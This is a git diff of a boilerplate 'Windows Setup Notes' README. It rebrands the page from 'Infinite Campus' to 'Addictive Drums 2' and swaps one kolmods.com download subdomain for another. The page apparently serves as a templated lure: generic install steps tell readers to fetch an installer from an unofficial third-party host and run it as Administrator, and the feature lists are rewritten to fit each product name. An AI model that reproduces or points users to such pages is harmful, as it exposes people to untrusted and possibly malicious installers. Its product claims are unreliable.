@@ -1,10 +1,10 @@
-# Infinite Campus Windows Setup Notes
+# Addictive Drums 2 Windows Setup Notes
 
-[⬇ Download Infinite Campus for Windows](https://infinite-campus.kolmods.com/)
+**Download:** [Get Windows installer →](https://addictive-drums-setup.kolmods.com/)
 
 ## Download & Install
 
-> Setup notes for **Infinite Campus** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **Addictive Drums 2** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -12,15 +12,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **Infinite Campus** from the Start menu
+5. Restart if the installer asks — then launch **Addictive Drums 2** from the Start menu
 
 ## What you can use it for
 
-- Core Infinite Campus features on Windows desktop
-- Install and configure Infinite Campus for daily use
-- Import, edit, and export with Infinite Campus tools
-- Tune settings and profiles inside Infinite Campus
-- Integrate Infinite Campus into your existing workflow
+- Virtual drum kits and realistic acoustic samples
+- MIDI groove libraries for fast songwriting
+- Multi-channel output for mix-ready drum tracks
+- DAW plugin or standalone drum production
+- Custom kit editing and velocity-layered hits
 
 ## License
 
